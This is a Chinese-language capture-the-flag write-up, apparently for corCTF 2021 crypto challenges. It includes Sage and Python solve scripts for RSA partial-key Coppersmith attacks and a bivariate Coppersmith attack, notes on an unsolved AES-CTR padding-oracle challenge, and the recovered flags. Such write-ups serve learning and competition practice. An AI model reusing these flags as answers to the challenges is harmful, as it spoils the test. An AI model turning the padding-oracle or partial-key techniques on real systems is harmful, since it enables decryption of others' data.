<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line">p = <span class="number">20936670545375210972091706288423179494163425035286134775773514440843943493090886819895346572945288304582498268271507942037581752184819846906869395551921930704321251130746547888224652316226957634541702883599286787839982090615950687496752999645558331533314682453610929822041558882012483238149288762974740347582024050756443700107245858419316423473568526347559377124536218894368962796664914408327949348396038507355935608178392088898784474582354438590711083089253977971653913217304360725716982473871023235180637867588860233011122300656470435644430602412710493441965130162664981423496370539240693045312454250776393871037539</span></span><br><span class="line">q = <span class="number">19872523115298089612152987731023453644084277408261276810219001288407280019889227914287760742936580023163800626696116882213533508813201232707621762739857924392306902336092739272758773377952936022982446120177174082641600741522817135305633293579042208014735900229922142564590095968054337719254632703676737069746032384348392244892496672044899073391936273280270753785076044108870166304800552404013519058026991588856235381264192387525832530187004466616791531223421070547342377071358044704265893255021275811622959301157507095984825182110574434699593886509171425701861331576642311553357835312334349976576969220483604368671153</span></span><br><span class="line">r = <span class="number">18342695102288954165224207958150786487860883752676419020596228714991017967256173183699487408637445601341687447489432163178271335469203559084363600703497940503946684342504933131623546315643648637992201226732630680112575643707020017139390225257319697353426087369722671485915571962910153169877358046375850132351117527591675467417925944135644417622440847857598273517926844822766083086147088819776687612745404553608100705862181700054385028096749375873889019995159762301115707945396140178370414857973922007665218670792403129624089144668480280115489465764431016721028424152163659378120333071194425845370101841510224643446231</span></span><br><span class="line">c = <span class="string">b&#x27;6255a505b969be8175a5c578fd6e856ecd85faa1a22fdf38d2d11851211676fd3047ed12c4027e66ed2173495877180e3d49a387b74701fbbbdce00a2248c7812b157626c95e7cf5727ee90cc9a6a98d84ee50f106b11245d65b87a27bbd7ab94b0d82eeb6e49e81249ae880c150ff87d8da701e9d317932fa2b27b64eb894a112d942d7d269478a6c120be885f3fbd065c38e70498c2f294b47bb08da09fb63c05070248079fe4311c9821dd8d3a08b15f13cdb0b7a8d406790c4796e0218851b496a11bf1ad7575be6d9999d5f1c73080d724c66a116f865ffcd3048be5d59dae55a4a063629d30429765733521702ec36d3f111b015934d15d620ad0e35ee56&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(xor(unhexlify(c), long_to_bytes(<span class="number">2</span>*q)))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>corctf{1_b3t_y0u_d1dnt_4ctu411y_d0_th3_m4th_d1d_y0u?}</p>
</blockquote>
<p>其实是个变种，la佬的博客上有</p>
<h2 id="Crypto-babyrsa"><a href="#Crypto-babyrsa" class="headerlink" title="Crypto-babyrsa"></a>Crypto-babyrsa</h2><p>willwam845师傅出的题</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line">n = <span class="number">73542616560647877565544036788738025202939381425158737721544398356851787401183516163221837013929559568993844046804187977705376289108065126883603562904941748653607836358267359664041064708762154474786168204628181667371305788303624396903323216279110685399145476916585122917284319282272004045859138239853037072761</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">flag = bytes_to_long(<span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ct = <span class="subst">&#123;<span class="built_in">pow</span>(flag, e, n)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Transcription of image:</span></span><br><span class="line"><span class="string">735426165606478775655440367887380252029393814251587377215443983568517874011835161632</span></span><br><span class="line"><span class="string">289108065126883603562904941748653607836358267359664041064708762154474786168204628181</span></span><br><span class="line"><span class="string">9145476916585122917284319282272004045859138239853037072761</span></span><br><span class="line"><span class="string">108294440701045353595867242719660522374526250640690193563048263854806748525172379331</span></span><br><span class="line"><span class="string">341078269246532299656864881223</span></span><br><span class="line"><span class="string">679098724593514422867704492870375465007225641192338424726642090768164214390632598250</span></span><br><span class="line"><span class="string">39563231146143146482074105407</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(n, p, q)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">n = 73542616560647877565544036788738025202939381425158737721544398356851787401183516163221837013929559568993844046804187977705376289108065126883603562904941748653607836358267359664041064708762154474786168204628181667371305788303624396903323216279110685399145476916585122917284319282272004045859138239853037072761</span><br><span class="line">e = 65537</span><br><span class="line">ct = 2657054880167593054409755786316190176139048369036893368834913798649283717358246457720021168590230987384201961744917278479195838455294205306264398417522071058105245210332964380113841646083317786151272874874267948107036095666198197073147087762030842808562672646078089825632314457231611278451324232095496184838</span><br><span class="line"></span><br><span class="line">Transcription of image:735426165606478775655440367887380252029393814251587377215443983568517874011835161632289108065126883603562904941748653607836358267359664041064708762154474786168204628181914547691658512291728431928227200404585913823985303707276110829444070104535359586724271966052237452625064069019356304826385480674852517237933134107826924653229965686488122367909872459351442286770449287037546500722564119233842472664209076816421439063259825039563231146143146482074105407</span><br><span class="line"></span><br><span class="line">(n, p, q)</span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/babyrsa.png" alt="babyrsa"></p>
<p>不愧是willwam845师傅，出的很有水平，截了discord上的一张图，利用截图截不全构造了已知p，q高位的攻击</p>
<p>和一般的CopperSmith已知p的高位攻击略不同，并没有直接给出p真正的高位，只是截取了10进制前几位，因为有n很容易就能知道<strong>p缺的十进制数的位数是41</strong>，所以要转换一下二进制才是，像图中我选中的二进制部分，这四个数都有，这才是真正的高位</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210826175750424.png" alt="image-20210826175750424"></p>
<p>这就和我们所熟悉的一样了吗</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210826181354805.png" alt="image-20210826181354805"></p>
<p>网上有一些<a href="https://www.dazhuanlan.com/gouridedouban/topics/1573757">脚本</a>，针对RSA已知p高位的，至少是p位数的$\frac{1}{2}$，还说如果位数不够需要爆破；不是很理解这个$\frac{1}{2}$，按道理来说275位应该早超多$\frac{1}{2}$位了呀，我多加了3位十六进制的爆破才出来</p>
<p>而且他这里也是至少知道576位，也是超过一半512的，不懂，评论区万能的师傅能告诉我吗？或者是和Copper格的原理有关，后续再研究</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210826184640398.png" alt="image-20210826184640398"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="comment"># 21837013929559568993844046804187977705376341078269246532299656864881223</span></span><br><span class="line"><span class="comment"># 341078269246532299656864881223</span></span><br><span class="line">n = <span class="number">73542616560647877565544036788738025202939381425158737721544398356851787401183516163221837013929559568993844046804187977705376289108065126883603562904941748653607836358267359664041064708762154474786168204628181667371305788303624396903323216279110685399145476916585122917284319282272004045859138239853037072761</span></span><br><span class="line">c = <span class="number">2657054880167593054409755786316190176139048369036893368834913798649283717358246457720021168590230987384201961744917278479195838455294205306264398417522071058105245210332964380113841646083317786151272874874267948107036095666198197073147087762030842808562672646078089825632314457231611278451324232095496184838</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"><span class="comment"># 已知P的高位，最后面12位二进制，也就是3位十六进制要参与爆破，所以要用000补充</span></span><br><span class="line"><span class="comment"># fakep&gt;&gt;237&lt;&lt;237转十六进制末尾填充3个0</span></span><br><span class="line">p = <span class="number">0x67629c283d2d5acd4ae3eaf8f43757591fee1234c5aa3044b3cf2d07d5cf58c503782000</span></span><br><span class="line"><span class="comment"># P原本的位数</span></span><br><span class="line">pbits = <span class="number">512</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 要爆破的12位二进制数，为2**12==4096，表示0~4096</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4096</span>):</span><br><span class="line">	p4 = p</span><br><span class="line">	p4 = p4 + <span class="built_in">int</span>(<span class="built_in">hex</span>(i),<span class="number">16</span>)</span><br><span class="line">	kbits = pbits - p4.nbits()</span><br><span class="line">	p4 = p4 &lt;&lt; kbits</span><br><span class="line">	PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">	f = x + p4</span><br><span class="line">	roots = f.small_roots(X = <span class="number">2</span>^kbits, beta = <span class="number">0.4</span>)</span><br><span class="line">	<span class="comment"># 经过以上一些函数处理后，n和p已经被转化为10进制</span></span><br><span class="line">	<span class="keyword">if</span> roots:</span><br><span class="line">		p= p4 + <span class="built_in">int</span>(roots[<span class="number">0</span>])</span><br><span class="line">		<span class="keyword">assert</span> n % p == <span class="number">0</span></span><br><span class="line">		q = n // p</span><br><span class="line">		<span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)), n)))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>corctf{1_w4s_f0rc3d_t0_wr1t3_ch4ll5_4nd_1_h4d_n0_g00d_1d345_pl5_n0_bully_;-;}</p>
</blockquote>
<h2 id="Crypto-babypad（unsolved）"><a href="#Crypto-babypad（unsolved）" class="headerlink" title="Crypto-babypad（unsolved）"></a>Crypto-babypad（unsolved）</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> Counter</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;/challenge/flag.txt&quot;</span>).read().encode()</span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">pt</span>):</span></span><br><span class="line">  iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">  ctr = Counter.new(<span class="number">128</span>, initial_value=bytes_to_long(iv))</span><br><span class="line">  cipher = AES.new(key, AES.MODE_CTR, counter=ctr)</span><br><span class="line">  <span class="keyword">return</span> iv + cipher.encrypt(pad(pt, <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">ct</span>):</span></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    iv = ct[:<span class="number">16</span>]</span><br><span class="line">    ct = ct[<span class="number">16</span>:]</span><br><span class="line">    ctr = Counter.new(<span class="number">128</span>, initial_value=bytes_to_long(iv))</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CTR, counter=ctr)</span><br><span class="line">    pt = cipher.decrypt(ct)</span><br><span class="line">    unpad(pt, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">  <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">  <span class="built_in">print</span>(encrypt(flag).<span class="built_in">hex</span>())</span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   <span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(decrypt(<span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>))))</span><br><span class="line">   <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<p>AES的CTR模式（计数器模式），大致的加密流程如下</p>
<p><img data-src="https://wumansgy.github.io/2018/11/03/AES%E7%9A%84CTR%E6%A8%A1%E5%BC%8F%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E8%AF%A6%E8%A7%A3/2.png" alt="img"></p>
<p>解密就是将Ciphertext和Plaintext互换位置，Key和Nonce不变</p>
<p>而我们从密文看，似乎flag小于16字节，也就是在32个字符以内，所以填充之后，就只有一组；除了密文和iv，其他具体的信息我们都得不到了，只有成功解密和失败解密回显的区别，看来要爆破</p>
<p>没什么思路，不知道是从流程下手，还是有针对CTR的攻击手法，题目提示pad</p>
<p>这个pad函数很有意思，不仅将明文填充成长度为16字节的倍数，而且根据剩余多少位补充不同的字节，比如</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210827155323100.png" alt="image-20210827155323100"></p>
<p>好在CTFTIME有师傅贴了<a href="https://git.lain.faith/BLAHAJ/writeups/src/branch/writeups/2021/corctf/babypad">WP</a>，去舔一波</p>
<p>首先他说CTR模式下的AES是流密码，应该有MAC（消息验证码），显然题目中没有提供；其次关键还是在这个pad上，题目采用的是pkcs#7，然后说什么流密码不需要填充啊，填充会让流密码变得不安全啊，因为<code>unpad(ct, 16)</code>这句话，如下图所示，格式错误的在unpad时会报错</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210827162305417.png" alt="image-20210827162305417"></p>
<p>所以解密这一步就相当于一个oracle告诉我们猜测的明文pad之后是正确的还是错误的</p>
<p>差不多知道要异或来爆破，但师傅的WP看不懂，主要是<code>encrypted_data ^ wanted_plaintext ^ known_plaintext</code>，只能直接看exp了</p>
<p>发现密码的题目也可以先打本地<code>r = process([&quot;python&quot;, &quot;./server.py&quot;])</code>，exp也看不懂</p>
<p>看<a href="https://www.sebven.com/ctf/2021/08/23/corCTF2021-babypad.html">另外一位师傅的</a></p>
<p>艹，看不懂啊，最近脑子不行啊，看了好几天，理解不了</p>
<p>padding oracle attack了解一下</p>
<h2 id="Crypto-babyrand（recuring）"><a href="#Crypto-babyrand（recuring）" class="headerlink" title="Crypto-babyrand（recuring）"></a>Crypto-babyrand（recuring）</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">und</span>():</span></span><br><span class="line">  p = getPrime(<span class="number">512</span>)</span><br><span class="line">  x = randrange(p)</span><br><span class="line">  a = p ^ x ^ randrange(<span class="number">2</span>**<span class="number">200</span>)</span><br><span class="line">  b = p ^ x ^ randrange(<span class="number">2</span>**<span class="number">200</span>)</span><br><span class="line">  <span class="keyword">return</span> p, a, b, x</span><br><span class="line"></span><br><span class="line">p,a,b,x = und()</span><br><span class="line"></span><br><span class="line">iv = urandom(<span class="number">16</span>)</span><br><span class="line">key = sha256(long_to_bytes(a) + long_to_bytes(b)).digest()[:<span class="number">16</span>]</span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c1 = <span class="subst">&#123;x&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c2 = <span class="subst">&#123;(x*a + b) % p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;iv = &#x27;<span class="subst">&#123;iv.<span class="built_in">hex</span>()&#125;</span>&#x27;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ct = &#x27;<span class="subst">&#123;cipher.encrypt(pad(flag, <span class="number">16</span>)).<span class="built_in">hex</span>()&#125;</span>&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>已知，注意这里是异或，不然后面不对</p>
<p><code>a = p ^ x ^ r1</code></p>
<p><code>b = p ^ x ^ r2</code></p>
<p><code>c2 = ax + b</code></p>
<p>思路比较简单，最后肯定是要算出a和b的</p>
<p>这里知道a和b的高312位，然后也知道关于a和b的一个二元一次方程，可以试试看<a href="https://blog.csdn.net/m0_49109277/article/details/119841141?spm=1001.2014.3001.5501">之前遇到的Copper解二元方程</a></p>
<p>竟然不行？</p>
<p>没有一丁点儿思路，去翻别的师傅的WP，在一位<a href="https://blog.y011d4.com/20210823-corctf-writeup/">日本师傅的博客</a>上找到</p>
<p>首先思路没错，就是用CopperSmith，<strong>CopperSmith yyds</strong>，但是那个函数的一个参数设置有问题，所以这次放一下<a href="https://github.com/defund/coppersmith">github仓库地址</a>，上面有<strong>单变量、双变量、三变量</strong>以及两个我不是很清楚为什么会在这儿的：<strong>boneh_durfee</strong>和<strong>approximate_factor</strong>的例子</p>
<p>参数设置如下</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210906164057386.png" alt="image-20210906164057386"></p>
<p>上面的案例我打印出来看了下</p>
<p><code>f</code>显然是多项式；</p>
<p><code>bounds</code>是变量的界限，也就是以<code>2^bits</code>的形式，作者说了这是为了优化格子的，所以不用特别的精确；</p>
<p><code>m</code>确定要使用的<code>f</code>和<code>N</code>的高次幂，我的理解是这个多项式中最大值大约是模数的多少倍，但感觉有点不对；</p>
<p><code>d</code>确定要使用多少个可变移位。所以这里起码<code>d=2</code>吧</p>
<p>但关于m和d，有一些和案例代码里的对不上，有清楚的师傅能不能ddw</p>
<p>这里之所以第一次没有出来，就是因为<code>roots = small_roots(f, (2^200, 2^200), m=3)[0]</code>，正确的应该至少是<code>roots = small_roots(f, (2^200, 2^200), m=1, d=2)[0]</code>。而且<code>m=1, d=2</code>是最快的，几乎一下就出来了，日本师傅的<code>m=3, d=4</code>要过一会，应该也是一个不要求特别严格的值吧</p>
<p>完整的exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">load(<span class="string">&#x27;coppersmith.sage&#x27;</span>)</span><br><span class="line">c1 = <span class="number">5365904711205493895182988721055598679508066289977091231731349423996531384326997250984304389796311073201846992254794801346573036775490182780952712232258774</span></span><br><span class="line">c2 = <span class="number">2351499357088933835557969576916974229915931074692169825269157710226395480997304497294813272746195475744137017453323338362896396977337638862808560417575150</span></span><br><span class="line">p = <span class="number">12118911800929768381158064532151564397584328623097191996086479213117076586014730135201334840794700976422626122702191630484231703678287738839516304757792517</span></span><br><span class="line">iv = <span class="string">&#x27;eacdfb3c2cd33a8ce71dbd9a11be89ad&#x27;</span></span><br><span class="line">ct = <span class="string">&#x27;ed36d8614dd35af75251496eef0bb76582dfb83cde59715df41150054be51ac15aaee8eb540a7dbbe58a6fae8287bd9e69043a4800a1e36055d415fd3f41735d3673b3dd5fbdd21941c48ac24ef9b1e288a8848c94e85cd1bda569d2a87c8f33bc790d9aaf97eed583d35a84cc75655cba591d3da9fa3c6e681a2727f2786ffccab3866006cda27d355d8d0665a88a24815b0133a2ff2c8541bc636ac2cc97e03b6189227d3b5469f736ce7373789809de794f987cfe437be56dbb32444055e23023ccd900934ed853ceb3cbac58775a3b7b1c9f3c5a0a32f273ae30ab8a8a9bf24585c39041c262820343eef64735636450dd8628f8a830e109ae3b2b05bef150c98a417b6632ca00c96ee544853955dc948d28dfff28071c5182656fa2ae56614207b9cd96b40cbe28e20bac396577272d341b86ff242daa904e67f226180a02cd2197f8dafda1dd325437e36e457802cefb692bcf0fe9a38addf1d493bd2d40bb972ceff8337fa81a7b9a29ebc6959617a6370b97b90ef8df90e0ea780a0aaea3affa6d7be74118328ca8e3eb060a5afce6f07487ad841382ee82018ba3f452b7f1a0968606739380572364fdfb3a8dac1ca8f856b4aaafbe9c45ad1f81c30f41606e8228ca59482c191af4ecb4f426863dbdbaf76e97a7f5867647e77837dc1b3c843e1a182cf9463f2215afae0d84f975da68d508ca05117de5f5f21a3d818e45cb7612ab052a36edbd7a2386e26777f597c524be57aad5ad254f8b6caa1cc8182d84e8d5a36ea9c5528f4152edb7ce4b5e58529787862a1e9736b2ab135b914835a72fced8485f736a0d7f18bf3d923c66b4c0acede868a3b3970b322675c85dbaf92b985d47bee0ffc18a7a2827dcf449d304d11fb9265d6367e55891f006ab3313a3df6da8c46f6f736b91f31c9c90b782af9a3a527c25f608a0e2ed62d019839587b647b05697c83f3ffafc10d545c8dfc7516e284ab572cd8216b7dcda698eb979f1cd23ba757bc865b51adb337b61bbb682a52fad42741f559a77d863b2ef8af02a8f7776819b02c9b10123c999f626bb563372e9ff141dbc4ac619c52f5a0e245f873b6cadc324e2ed62c6f1858beb8988cfdeb1fa1b223cd1b2ae295c032aa58b46d12c6ace4515561bfb8276ea4b6536aec2b42cfbb64eb30f39d3e79d220da29cd46bd1c8cca85f6c11a8c1b2c265099d51d10651444eea0bbbb556a8de4bf0df8cf9904f4dc7f7840f82a7b4101b7ff499d6f619555c906ce7381c7fe4f165330d76cda4e36ff421a402b1b8bcfcbbc5c80c71ccc9814996723ba4f30f52537bf99547af16bf51bcc6795f7f2cbbf67b0cd0d8d432ff77d17758af8e6309915f152cab18c56495a0b82bdbeb96386a44bb761ee3da3c262d6eb69ee03cc5acbbac45dda3b75a863508bbab3aac1ec8371c1b62753d9a1931c2e8285295902edec528384264c4ccc2d0f9073eae44b81355b82df39f142d3fc5df63e668ea9c6375bea7ee9685830ae39a64ad30af300b4e56fe10b8cd0b0e03488828af68e6fa03f05bc8c38d12c9025e35767f22d67668d081e9827dbe2cfa6ad29d7d7e5bc88135fad55550406226c0c71f16dc901211475e35b8ad97827ee1d0dc3c015b326f884dd3dd8792864a093f73b68169f206606225c85c28af07cd27e35d6b738307629ef71160ac7717f42f0ad26a5f0ddb0aa8940fc72fd054efffe96bb2b5d3d2c68939b256650f9c3db146b69c0a5749b130424a069a2d75b0df890b86c00af1704dbb3f891dea94c152406c1fa636fce8e96db8e4db3f1f4ba2634fd9344664b788b4289acadb0bc543b65018572503d34227ab3ffbce86247cb740dca70c73c85ac29aa646b760314acd0838f0048728cedec961711c2c7f339ea816411cb87ffbc13a7a3e533505df4ac45357b7e002979496343647e33f6d5becfc3c02e357985708f817ea39b9db2cee18af34fe0f93662120e5c496bce6d39f9fc46ef6817f4183227391d73f815cfdbc3a1c58b554b4407a7dfada42945dff9d5f500b8ba588f20f6db575754bada30049a234ea503147cbaf4de8c72f451bd1c47a51d87f9bebf9e738a631863e01ffe7f32e2b620a17ec373acab84eaa0f02a7656a2d39a405c43e770b46c990230b921d9a1e6c38b45ed14011216a41880149eb2392ed7c8e88568f0bcf0e406f91b9ef98adb59bfc45504b6766074058005c059d1422cf7c343fdc88195977e106b42fcf41e95743ced2a670371013ac4cc86e412d7ee9692e0beb540198ab2661fbeebb38be431811f4ab129eb406fa4d6ab2904848941798ab042b0a05622099cf8244045dc4e0006ed30ada599e2f32cc2e474ed836176e7f5e26488295179b67aca112246d63c7a17a86a087087f39c0abce7fbeed200be9daa6cf638685c3feeb5ec265a3f8fd8ae5ad1f86fc08750b636860b1b8bdc309c31da8278f28e7e3326791998f2e74b88da31ad1090156b182b2d11a1fff2dc43a238b1b103519124ed8db6407525d9da8e3773e7652e4b11978ec0d7df57832d96970ec790a11883428a585d6650f13f37c90679aead37055351fd7852472a19bc5d9df2841fada9fbefd432ea15c548924e477642a04c93b681e1326469aa8919262517cee53657134d9effc3bf68752f7ebfb87862cf34e585b1baacbe73062764915d5d6db44a386473ea07cc13d42260aae8919720ccae0e80e09decec61c5c741fd255b5e789734d9a7b86a2500c9b50c009f6b4b96d832a9ddc1695efeb21a7de77b61eadaa4406e0ae58facd6d6b5f4b4b736a335046dadab07d23b4c171270f2e3f0c29154c2dcd10085999106301069f292402a0fc3d0ba19677b921bd70e7bbc501e7bec663dee6aaa2f6cf62cfa3ee268d57721dfb71ff95301514d404e38b67c2753aa4ab4e4be9949fa495c1fc61143b4c4563021bacbb051bdf9419cddaf0e0015655a46fb53a4c7452a0f15ae9fa45cd8bdfab768456912f6cba7ad066ca493714db1abd1625c3d6971264143fe4ef2513e4c4b6f229272271edb8998ad0a9c3e0ed41a792c22b75c6a4c87d37f7b0aa600fb903857453ee137d880e09882535e8e51d719f5ca83d0fa01d71b5115c9190ae95eaafed8a272f9abd5e040aad5042bfbf7399a6f7f2f6932e9ce8ddb856663c6177864cdae1a7d116bb258de586e621b399e870f3909acdbbcbe4fa6f9f2fcb605ed250e11f43fc3c8645ed980d94a5d3a14aab60ba5725a363f845566f170eede27a65a0a2a30865c22aa7d5cafe0ea3252645b8086f3a5443bb8c869990446ddb34e73b99d1d6cb8cdc9c69b94d20785ffde8ad38f92319d56e90a4569d235581656f6f2df761fb792833b4e72207e157841bcc99b3860abfb37f76dd77615420988e1702751e11aa5579e9f1987f3519bfb0fcf835d63b825f9128db50c8c1eccc88a64b4df432c72654371154884c54abc2c5b31693de5265c685dc7e0eeb10bcdca698bfb75016b1dfec2ece20ec4951fd338775d239db1663f63b328d6c6a0415f35f23cffae21a9db195118f22083c5fcbd7192cfa611748cb79486ab78b16b0f1b8d5e81410b0213ff6f603dec71909c6b07bf12618551e4f9c8eaf7346c890b4c10c02970011242a9c57933cdff2526985c0009341474f7d18d197558585feca1cb0030afc784906b45bef19d4cc32b0ae289a08a3eadad86e512100dde8a85d8ab9cc5740cd2e58848b56b7f07defeb43d28aaa6e5a7e46a221323a928088743845b6dc669868634117a50759e5f144f35297374f79e6059a159ca0596fb26273a219fcdc9e5c56a2b9efa0fe392cf54b0c&#x27;</span></span><br><span class="line"></span><br><span class="line">x = c1</span><br><span class="line">iv = <span class="built_in">bytes</span>.fromhex(iv)</span><br><span class="line">ct = <span class="built_in">bytes</span>.fromhex(ct)</span><br><span class="line"></span><br><span class="line">bar = (p ^^ x) &gt;&gt; <span class="number">200</span> &lt;&lt; <span class="number">200</span></span><br><span class="line">Fp = Zmod(p)</span><br><span class="line">bar, x, c2 = <span class="built_in">map</span>(Fp, [bar, x, c2])</span><br><span class="line">PR.&lt;k0, k1&gt; = PolynomialRing(Fp)</span><br><span class="line">f = x * (bar + k0) + bar + k1 - c2</span><br><span class="line"><span class="comment"># m = 2</span></span><br><span class="line">roots = small_roots(f, (<span class="number">2</span>^<span class="number">200</span>, <span class="number">2</span>^<span class="number">200</span>), m=<span class="number">1</span>, d=<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">k0, k1 = roots</span><br><span class="line"></span><br><span class="line">a = bar + k0</span><br><span class="line">b = bar + k1</span><br><span class="line">key = sha256(long_to_bytes(a) + long_to_bytes(b)).digest()[:<span class="number">16</span>]</span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"><span class="built_in">print</span>(unpad(cipher.decrypt(ct), <span class="number">16</span>))</span><br></pre></td></tr></table></figure>

<p>出来的挺奇怪的，但有flag</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210906164927922.png" alt="image-20210906164927922"></p>
<blockquote>
<p>corctf{c0ngr4tul4t10ns_y0u_4r3_n0w_p4rt_0f_th3_d3fund_f4n_club!}</p>
</blockquote>
<p>decode一下，这个头像是啥寓意，评论区有师傅告诉我吗；defund是实现了Copper的github库的主人</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210906170222706.png" alt="image-20210906170222706"></p>
<p>我也是defund师傅的小迷弟了</p>
